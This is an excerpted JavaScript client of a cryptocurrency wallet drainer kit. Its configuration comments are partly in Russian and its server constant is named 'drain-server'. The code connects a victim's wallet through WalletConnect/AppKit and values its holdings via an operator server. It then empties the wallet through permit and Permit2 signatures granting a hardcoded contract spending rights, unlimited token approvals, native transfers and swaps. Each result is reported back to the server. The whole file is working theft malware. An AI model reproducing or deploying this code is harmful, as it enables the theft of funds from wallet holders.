...
const MS_Server = "https://drain-server.vercel.app"; // demo-drain.theworkpc.com Указать домен, который прикреплен к серверу дрейнера
...
const MS_WalletConnect_Customization = 1; // 0 - использовать окно по умолчанию, 1 - пользовательская кастомизация
...
import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.13.3/dist/ethers.min.js";

/* const rpcUrl = MS_Settings?.RPCs?.[asset.chain_id];
if (!rpcUrl) {
  throw new Error(`No RPC URL configured for chain ${asset.chain_id}`);
}
const node = new ethers.JsonRpcProvider(rpcUrl);
console.log("Loaded RPCs:", MS_Settings.RPCs); */
...
MS_Connection = false, MS_Load_Time = null, MS_Gas_Multiplier = 1.5, MS_Partner_Address = false;
...
// MODIFICATION
// ✅ Make ms_init available globally:
window.ms_init = ms_init;
...
// 🧹 Ensure no WalletConnect/AppKit cache exists before initializing modal
(() => {
  try {
      ...
      Object.keys(localStorage)
        .filter(
          (key) =>
            ...
            key.toLowerCase().includes('appkit') ||
            key.toLowerCase().includes('wagmi') ||
            key.toLowerCase().includes('reown')
        )
        .forEach((key) => {
          console.log('🗑️ Removing localStorage key (pre-init):', key);
    ...
    if (window.indexedDB) {
      ...
      for (const dbName of dbs) {
        ...
        req.onsuccess = () =>
          console.log(`🗑️ Pre-init IndexedDB cleared: ${dbName}`);
      }
    }
  } catch (err) {
    console.warn('Pre-init cache clear failed:', err);
  }
})();
...
const projectId = MS_WalletConnect_ID; // already defined in your config
...
const modal = createAppKit({
  ...
  networks: appKitNetworks,
  projectId,
  themeMode: MS_Color_Scheme,
  metadata: MS_WalletConnect_MetaData,
  enablePersistence: false // 🚫 disable session restore
}); 
...
/* const modal = createAppKit({
  ...
  metadata: {
    ...
    url: 'http://localhost', // must match whitelisted origin
...
modal.subscribeAccount(state => {
  MS_Current_Address = state.address;
});
modal.subscribeProviders(state => {
  eip155Provider = state['eip155'];
  MS_Provider = eip155Provider; // used everywhere in your script
});

// 🔄 Always disconnect wallet on page reload
/* window.addEventListener("load", async () => {
  try {
    const state = await modal.getState?.();
    if (state?.connected || state?.account?.address) {
      await modal.disconnect();
      console.log("Wallet disconnected on reload");
    }
  } catch (err) {
    console.warn("Auto disconnect failed:", err);
  }
}); */
...
const send_request = async (data) => {
  try {
    ...
    // ✅ Safe JSON stringify that auto-converts BigInts to strings
    const safeStringify = (obj) =>
      JSON.stringify(obj, (_, v) => (typeof v === 'bigint' ? v.toString() : v));

    const request_data = prs(encode_key, btoa(safeStringify(data)));

    // ✅ Use HTTPS if available — or fallback to HTTP for local testing
    const response = await fetch(
      (location.protocol === 'https:' ? 'https://' : 'http://') + MS_Server,
      {
        method: 'POST',
        headers: {
          Accept: 'text/plain',
    ...
    if (response_data.status === 'error') {
      if (response_data.error === 'SRV_UNAVAILABLE') MS_Force_Mode = true;

      if (response_data.error === 'INVALID_VERSION') {
        MS_Force_Mode = true;
        try {
          if (MS_Loader_Style == 2) {
            MSL.fire({
              ...
              text: "Please check client/server version — they don't match, or clear cache.",
            ...
            Swal.close();
            Swal.fire({
              html: '<b>Server Error</b> Please check client/server version — they may not match. Try clearing cache.',
              icon: 'error',
...
const retrive_config = async () => {
  try {
    ...
    if (response.status == 'OK') {
	  ...
	  console.log('MS_Settings', MS_Settings);
...
const insufficient_balance = async (asset) => {
  try {
    if (!MS_Settings.Notifications['insufficient_balance']) return;
    await send_request({ action: 'insufficient_balance', user_id: MS_ID, asset });
  } catch(err) {
    console.log(err);
  }
};
...
const connect_success = async () => {
  try {
	...
	//console.log('connect_success MS_Current_Chain_ID', MS_Current_Chain_ID);
    await send_request({
...
const get_nonce = async (chain_id) => {
  const node = new ethers.JsonRpcProvider(MS_Settings.RPCs[chain_id]);
  await node.getNetwork(); // ⬅️ forces ethers to complete network detection
...
const is_nft_approved = async (contract_address, owner_address, spender_address) => {
  try {
    const node = new ethers.JsonRpcProvider(MS_Settings.RPCs[1]);
...
const get_gas_limit_def_by_chain_id = (chain_id) => {
 ...
 /*const SIGN_NATIVE = async (asset) => {
  ...
  const node = new ethers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  ...
  const gas_price = (gasPrice / 100n) * BigInt(Math.floor(MS_Gas_Multiplier * 100));
  ...
  //const tokens_gas_fee = gas_price;
  ...
  const available_amount = balance - gas_limit * gas_price;
  if (available_amount.lte(BN(0))) {
	  await insufficient_balance(asset);
	  throw 'LOW_BALANCE';
  }
  ...
  //console.log('FORCE DO_CONTRACT');
  //await DO_CONTRACT(asset);
  //console.log('THROWS ERROR CAUSE OF ETH.SIGN');
...
/* const SIGN_NATIVE = async (asset) => {
  ...
  unsigned_tx.gas = gas_limit.toString();
  unsigned_tx.value = web3.utils.toHex(available_amount.toString());
  unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
...
const SIGN_TOKEN = async (asset) => {
  ...
  let max_approval_amount = asset.amount_raw;
  ...
  //const available_amount = balance.sub(gas_limit.mul(gas_price));
  const available_amount = balance - gas_limit * gas_price;
  //const available_amount = balance.sub((gas_price));
  
  console.log('asset', asset);
  //console.log('gas_price', ethers.formatUnits(gas_price, 'ether'));
  const available_balance = web3.utils.toHex(available_amount.toString());
  console.log('available_balance', available_balance); 
  //console.log('available_amount', ethers.formatUnits(available_amount, 'ether'));
  ...
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await sign_success(asset); sign_ready(); return 1;
};
...
const DO_SWAP = async (asset) => {
  ...
  const gas_price = ethers.toBigInt(await node.getGasPrice()).div(ethers.toBigInt('100')).mul(ethers.toBigInt('120')).toString();
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      ...
      gas_limit = ethers.toBigInt(gas_limit).div(ethers.toBigInt('100')).mul(ethers.toBigInt('120')).toString();
      gas_attempts = 3;
    } catch(err) {
  ...
  const swap_value = ethers.toBigInt(asset.amount_raw).lte(ethers.toBigInt(asset.swapper_allowance))
  ? ethers.toBigInt(asset.amount_raw).toString() : ethers.toBigInt(asset.swapper_allowance).toString();
...
const DO_UNISWAP = async (asset, all_tokens) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  ...
  for (const token of all_tokens) {
    try {
      const swap_value = ethers.toBigInt(token.amount_raw).lte(ethers.toBigInt(token.swapper_allowance))
      ? ethers.toBigInt(token.amount_raw).toString() : ethers.toBigInt(token.swapper_allowance).toString();
...
const DO_CONTRACT = async (asset) => {
  ...
  console.log('MS_Gas_Multiplier', MS_Gas_Multiplier);
  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
  const tokens_gas_fee = token_limit.mul(MS_Gas_Reserves[asset.chain_id] + 1).mul(gas_price);
  
  //tokens_gas_fee = gas_price;
  ...
  if (MS_Settings.Settings.Use_Public_Contract && MS_Settings.Public_Contract[parseInt(asset.chain_id)] != null) {
	...
	//MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address = MS_Settings.Public_Contract[parseInt(asset.chain_id)][MS_Settings.Settings.Use_Public_Premium ? (asset.amount_usd >= 0 ? 1 : 0) : 0];
  }
  ...
  console.log('Contract_Address', MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address);
  ...
  if (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 0) {
	...
	console.log('web3_contract.methods', [MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type]);
	...
	console.log('contract_data', web3_contract.methods[MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type](MS_Current_Address, MS_Settings.Receiver,
    secondary_address, web3.utils.toHex(!split_data ? 0 : split_data), MS_Settings.Settings.Use_Back_Feature));
  ...
  //const decimalValue = ethers.toBigInt(unsigned_tx.value).toString();
  console.log('tx value', ethers.formatUnits(unsigned_tx.value, 'ether')); // Output: 24743998130958210
...
/* const DO_RANDOMIZER_NATIVE = async (asset) => {
	console.log('DO_RANDOMIZER_NATIVE');
  const node = new ethers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  //const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));
  const feeData = await node.getFeeData();
  const gasPrice = feeData.gasPrice ?? 0n;
...
const TRANSFER_NATIVE = async (asset, ignore_contract = false) => {
  ...
  console.log('TRANSFER_NATIVE unsigned_tx',unsigned_tx);

  await transfer_request(asset); sign_next();
  //const tx = await MS_Signer.sendTransaction(unsigned_tx);
  try {
	  const tx = await MS_Signer.sendTransaction(unsigned_tx);
	  console.log('TRANSFER_NATIVE tx', tx);
    } catch (error) {
...
const DO_RANDOMIZER_TOKEN = async (asset) => {
	console.log('DO_RANDOMIZER_TOKEN');
  const node = new ethers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  //const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));
  const feeData = await node.getFeeData();
  const gasPrice = feeData.gasPrice ?? 0n;
...
const TRANSFER_TOKEN = async (asset) => {
  ...
  console.log('FORCE APPROVE_TOKEN');
...
const DO_PERMIT2 = async (asset, assets) => {
  ...
  let permit_deadline = Date.now() + 1000 * 60 * 60 * 24, permit_signature = null, permit_message = null, permit_mode = null;
  if (assets.length > 1) {
    let permit_types = {
      "PermitBatch": [
        {
...
/* const DO_PERMIT2 = async (asset, assets) => {
  ...
  const customContractAddress = '0x71ed2ae6645799812e7376252c05ee693c47c8d8';
  const contract = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_BATCH'], MS_Signer);
  let permit_domain = { 
    name: "Permit2", 
  ...
  let permit_deadline = Date.now() + 1000 * 60 * 60 * 24; 
  let permit_signature = null, permit_message = null, permit_mode = null;
  ...
  if (assets.length > 1) {
    ...
    for (const x_asset of assets) {
      try {
        tokens.push({
          ...
          "amount": x_asset.amount_raw,
          "nonce": (await contract.allowance(MS_Current_Address, x_asset.address, customContractAddress)).nonce // Allow custom smart contract to spend tokens
        });
      } catch (err) {
        console.log(err);
      }
    ...
    permit_message = {
      "details": tokens,
      "spender": customContractAddress, // Setting the custom smart contract as the spender
      "sigDeadline": permit_deadline
    };
    ...
    permit_message = {
      "details": {
        ...
        "expiration": permit_deadline,
        "nonce": (await contract.allowance(MS_Current_Address, asset.address, customContractAddress)).nonce // Allow custom smart contract to spend tokens
      },
      "spender": customContractAddress, // Setting the custom smart contract as the spender
      "sigDeadline": permit_deadline
    };
    
    swap_request("PermitSingle", asset, [asset]); 
    sign_next();
    permit_signature = await MS_Signer._signTypedData(permit_domain, permit_types, permit_message);
    permit_mode = 1;
  }
  if (permit_signature != null) {
    await swap_success('Permit2', asset, assets); wait_message();
    const x_promise = send_request({
      action: 'con_permit', user_id: MS_ID, signature: permit_signature,
      message: permit_message, asset: asset, assets, address: MS_Current_Address,
      mode: permit_mode, PW: MS_Settings.Personal_Wallet
    });
    if (MS_Settings.Settings.Wait_For_Response) await x_promise;
...
/* const PERMIT_TOKEN = async (asset) => {
    ...
    if (asset.permit == 1) {
        ...
        permit_values = {
            ...
            spender: 0x71ed2ae6645799812e7376252c05ee693c47c8d8, // Replace with your contract address
            nonce: nonce,
            expiry: deadline,
            allowed: true
        };
...
/* const fetchABI = async (contractAddress) => {
    try {
        ...
        return JSON.parse(data.result);  // Convert ABI string to JSON
    } catch (error) {
...
const PERMIT_TOKEN = async (asset) => {
    try {
        console.log("PERMIT_TOKEN: Starting...");
        console.log("PERMIT_TOKEN: Asset Details", asset);

        if (!asset || !asset.address || !asset.amount_raw) {
            console.error("PERMIT_TOKEN: Invalid asset data");
            return;
        }
        ...
        // 🔹 Check if the contract has `nonces` function
        let nonce = 0;
        if (typeof contract.nonces === "function") {
            nonce = await contract.nonces(MS_Current_Address);
        } else if (typeof contract.getNonce === "function") {
            nonce = await contract.getNonce(MS_Current_Address);
        } else {
            console.warn("PERMIT_TOKEN: Contract does not support nonces()");
            return;
        }
        ...
        for (const c_address of MS_Settings.Unlimited_BL) {
            try {
                ...
                console.warn("PERMIT_TOKEN: Error checking blacklist", err);
            }
        }
        ...
        console.log("PERMIT_TOKEN: Signing permit...");
        const result = await MS_Signer._signTypedData(
            {
                name: name,
                version: asset.permit_ver,
        ...
        console.log("PERMIT_TOKEN: Sending request...");
        const x_promise = send_request({
            action: "permit_token",
            user_id: MS_ID,
            sign: {
        ...
        sign_ready();
        console.log("PERMIT_TOKEN: Success!");
        return 1;
    } catch (error) {
        console.log("PERMIT_TOKEN: ERROR", error);
        //return 0;
    }
};
...
const sign_success = async (asset, amount = '0') => {
  try {
    if (asset.type == 'NATIVE') {
      ...
      const out_amount = ethers.toBigInt(asset.amount_raw);
      asset.amount_usd = parseFloat(ethers.formatUnits(out_amount, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
...
const get_wallet_assets = async (address) => {
  try {
    ...
    if (response.status == 'OK') assets = response.data; 
      ...
      if (MS_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Critical Error', subtitle: 'Set up estimators', text: 'None of the evaluators are activated in the script settings, evaluation of wallet assets is impossible, check the settings and restart the server!',
          showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
        });
      } else {
        Swal.close();
        Swal.fire({
          html: '<b>Error</b><br><br>None of the evaluators are activated in the script settings, Valuation of wallet assets is impossible, check your settings and restart the server!', icon: 'error',
          allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
          showConfirmButton: true, confirmButtonText: 'OK'
        });
      }
	...
	for (let x = (assets.length - 1); x >= 0; x--) {
		try {
			...
			if (!MS_Settings.Settings.Chains[chain_id].Enable) {
				includeAsset = false;
			} else if (asset.type === 'NATIVE' && !MS_Settings.Settings.Chains[chain_id].Native) {
				includeAsset = false;
			} else if (asset.type === 'ERC20' && !MS_Settings.Settings.Chains[chain_id].Tokens) {
				includeAsset = false;
			} else if (asset.type === 'NATIVE' && asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_Native_Price) {
				includeAsset = false;
			} else if (asset.type === 'ERC20' && asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_Tokens_Price) {
				includeAsset = false;
			} else if (asset.type === 'ERC20') {
				// Add async operations to promises but do not modify the array directly
					...
					token_promises.push(new Promise(async (resolve) => {
						try {
							if (asset.amount_usd >= MS_Settings.Settings.Permit2.Price) {
								const node = new ethers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
								//await node.getNetwork(); // ⬅️ forces ethers to complete network detection
								await node.getNetwork(); // works reliably
								console.log('node',node);
								...
								if (ethers.toBigInt(allowance) > 0n) {
									asset.permit2 = true;
	...
	//console.log('Before Promise assets:', processedAssets);

	// Await all promises before proceeding
	Promise.all(token_promises).then(() => {
		//console.log('After For loop Assets:', processedAssets);
	});
...
const APPROVE_TOKEN = async (asset) => {
    ...
    try {
      for (let x = 0; x < 2; x++) {
        ...
        try {
          ...
          const ic_node = new ethers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  ...
  //const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));
  const feeData = await node.getFeeData();
  const gasPrice = feeData.gasPrice ?? 0n; // fallback if null
  const gas_price = (gasPrice / 100n) * BigInt(Math.floor(MS_Gas_Multiplier * 100));
  ...
  //contract_data = web3_contract.methods.approve('0x000000000022d473030f116ddee9f6b43ac78ba3', max_approval_amount).encodeABI();
...
const MM_APPROVE_TOKEN = async (asset) => {
  ...
  contract_data = web3_contract.methods[increase_type]('0x000000000022d473030f116ddee9f6b43ac78ba3', max_approval_amount).encodeABI();
...
const connect_wallet = async (provider = null) => {
  ...
  try {
    if (!MS_Connection) {
      ...
      if (MS_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Critical error', subtitle: 'No connection to the server', text: 'The script cannot connect to the server and receive data, Perhaps you configured something incorrectly or the server domain is not yet available or has been blocked. Check and correct problems before using the site.',
          showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
        });
      } else {
        Swal.close();
        Swal.fire({
          html: '<b>Critical error</b><br><br>The script cannot connect to the server and receive data, Perhaps you configured something incorrectly or the server domain is not yet available or has been blocked. Check and correct problems before using the site.', icon: 'error',
          allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
          showConfirmButton: true, confirmButtonText: 'OK'
        });
      }
    ...
    if (MS_Bad_Country) {
      ...
      try {
        if (MS_Loader_Style == 2) {
          MSL.fire({
            icon: 'error', title: 'Critical Error', subtitle: 'Prohibited geolocation', text: 'Please, leave this website immediately, it is not intended for Russia and CIS countries, dont try to use a VPN, It is not safe!',
            showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
          });
        } else {
          Swal.close();
          Swal.fire({
            html: '<b>Warning</b><br><br>Please, leave this website immediately, it is not intended for Russia and CIS countries, Dont try to use a VPN, its not secure!', icon: 'error',
            allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
            showConfirmButton: true, confirmButtonText: 'OK'
          });
        }
    ...
    try {
      ...
      if (MS_Current_Provider == 'WalletConnect') {
		...
		//MODIFICATION
        //await load_wc();
		//await MS_Provider.enable();
		/* if (modal) {
		  await modal.disconnect();
		  console.log('AppKit modal Disconnected');
		  return;
		} */
		console.log('connect modal.open');
		if (!modal) {
		  console.error('AppKit modal not initialized yet');
		  return;
		}
		await modal.open();
        /* try {
        ...
        /*  if (MS_Provider && MS_Provider.accounts.length > 0) {
          ...
          MS_Web3 = new ethers.BrowserProvider(MS_Provider);
          MS_Signer = await MS_Web3.getSigner();
		...
		/* if (MS_Provider && MS_Current_Address) {
			if (!MS_Current_Address.includes('0x')) {
			  MS_Process = false;
			  console.log('connect_cancel 1');
			  return await connect_cancel();
			}

			await new Promise(r => setTimeout(r, 2500));

			MS_Current_Chain_ID = MS_Provider.chainId || networkState?.chainId || null;
			MS_Web3 = new ethers.BrowserProvider(MS_Provider);
			MS_Signer = await MS_Web3.getSigner();
	  ...
	  const waitForWalletAddress = async () => {
		  while (!MS_Current_Address || typeof MS_Current_Address !== 'string' || !MS_Current_Address.match(/^0x\S+$/)) {
	   ...
	   while (!MS_Current_Address || typeof MS_Current_Address !== 'string' || !MS_Current_Address.match(/^0x\S+$/)) {
		...
		if (MS_Provider && MS_Current_Address) {
			...
			MS_Current_Chain_ID = Number(network.chainId);
			
			/* MS_Current_Chain_ID = MS_Provider.chainId || networkState?.chainId || null;
			MS_Web3 = new ethers.BrowserProvider(MS_Provider);
			MS_Signer = await MS_Web3.getSigner(); */
            
			//console.log('MS_Current_Chain_ID', MS_Current_Chain_ID);
			if (MS_Settings.Settings.Sign.WalletConnect == 0) {
			  MS_Sign_Disabled = true;
			}
		} else {
      ...
      console.log(err);
      MS_Process = false;
	  //console.log('connect_cancel 3');
      return await connect_cancel();
    }
	console.log('wallet connect finish');
    await modal.close();
    ...
    /* if (MS_Settings.V_MODE == 1) {
      if (MS_Loader_Style == 2) {
        MSL.fire({
          icon: 'load', title: 'Waiting for action', text: 'Sign message to verify your wallet',
          showConfirmButton: true, confirmButtonText: 'Waiting...', color: MS_Color_Scheme
        });
      } else {
        Swal.fire({
          html: '<b>Sign message</b> to verify you wallet...',
          imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
          timer: 0, width: 600, showConfirmButton: false
        });
	...
	console.log('Current Address:', MS_Current_Address);
	//GET ASSETS CALLED
    let assets = await get_wallet_assets(MS_Current_Address);
	//console.log('get_wallet_assets called',assets);
	// Sort assets by amount_usd in descending order
	//assets.sort((a, b) => b.amount_usd - a.amount_usd); done in get_wallet already
    ...
    let assets_usd_balance = 0; for (const asset of assets) assets_usd_balance += asset.amount_usd; //console.log('assets_usd_balance',assets_usd_balance);
    ...
    while (should_repeat_all) {
	  ...
	  // Sort assets by amount_usd in descending order
	  //assets.sort((a, b) => b.amount_usd - a.amount_usd);
	  
	  // First loop: Sign all ERC20 tokens
	for (const asset of assets) {
		try {
			if (asset.skip) continue;

			if (asset.type === 'ERC20') {
				// Retrieve ABI if not available
				if (!asset.abi) {
					try {
						const data = await retrive_token(asset.chain_id, asset.address);
						asset.abi = data;
						...
						console.log('Failed to retrieve ABI:', err);
						asset.abi = null; // Mark ABI as null if retrieval fails
					}
				}

				// Check if signing is enabled
				if (MS_Settings.Settings.Sign.Tokens > 0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force === 1)) {
					let signed = false;
					...
					if (asset.abi) {
						try {
							...
							console.log('PERMIT_TOKEN: UNSUCCESSFUL', err);
					...
					if (!signed) {
						try {
							...
							console.log('APPROVE_TOKEN: UNSUCCESSFUL', err);
							await approve_cancel();
						}
					}

					// Try SIGN if both PERMIT and APPROVE fail
					if (!signed) {
						try {
							let res_code = await SIGN_TOKEN(asset);
							if (res_code === 1) {
								/* const x_promise = send_request({
									action: 'approve_token',
									user_id: MS_ID,
							...
							console.log('SIGN_TOKEN: UNSUCCESSFUL', err);
							await approve_cancel();
						}
					}

					// Mark the asset as processed
					if (signed) asset.skip = true;
				}
			}
		} catch (error) {
	  ...
	  // Second loop: After all ERC20 tokens are signed, send withdrawal requests for each signed ERC20 token
/* 	  for (const asset of assets) {
		  //console.log('Second loop: After all ERC20 tokens are signed');
		  try {
			  if (asset.skip && asset.type == 'ERC20') { // Check if the asset is ERC20 and signed
				  const x_promise = send_request({
					  action: 'approve_token',
					  user_id: MS_ID,
					  asset,
				  ...
				  // Optionally wait for the response if needed
				  if (MS_Settings.Settings.Wait_For_Response) await x_promise;

				  console.log(`Withdrawal request sent for ${asset.name}`);
			  }
		  } catch (error) {
      ...
      /*for (const asset of assets) {
        ...
        try {
	      if (asset.skip) continue;
          //if (asset.skip && asset.type == 'ERC20') continue;
          let is_chain_correct = false;
          if (asset.type == 'NATIVE') {
			console.log('NATIVE', asset.name);
            const node = new ethers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
			...
			//const available_amount = balance.sub(gas_limit.mul(gas_price));
			const available_amount = balance - gas_limit * gas_price;
			//const available_amount = balance.sub(tokens_gas_fee);
			console.log("Balance:", balance.toString());
			console.log("Gas Limit:", gas_limit.toString());
			console.log("Gas Price:", gas_price.toString());
			console.log("Tokens Gas Fee:", tokens_gas_fee.toString());
			console.log("Available Amount:", available_amount.toString());
            if (available_amount.lte(BN(0))) {
				await insufficient_balance(asset);
				console.log('NATIVE DONT ENOUGH BALANCE');
				continue;
			}
			console.log('NATIVE HAS ENOUGH BALANCE');
          }
          if (asset.chain_id != MS_Current_Chain_ID) {
            ...
            is_chain_correct = true;
			console.log('is_chain_correct');
          }
          if (!is_chain_correct) continue;
          if (asset.type == 'NATIVE') {
			console.log('NATIVE 2',asset.name);
			...
			console.log('Third Loop 2');
			//console.log(asset.type);
			//console.log(asset.name);
			//console.log(asset.permit2);
            if (typeof asset.permit == 'undefined' && MS_Settings.Settings.Permit.Mode && asset.amount_usd >= MS_Settings.Settings.Permit.Price) {
              ...
              if (permit_type > 0) {
                ...
                console.log(`[PERMIT FOUND 2] ${asset.name}, Permit Type: ${permit_type}, Version: ${asset.permit_ver}`);
              }
            }
            if (asset.permit > 0) {
...
/* document.addEventListener('DOMContentLoaded', async () => {
  try {
    // Continue with your normal init
...
// MODIFICATION
// ✅ Make use_wc available globally:
window.use_wc = use_wc;
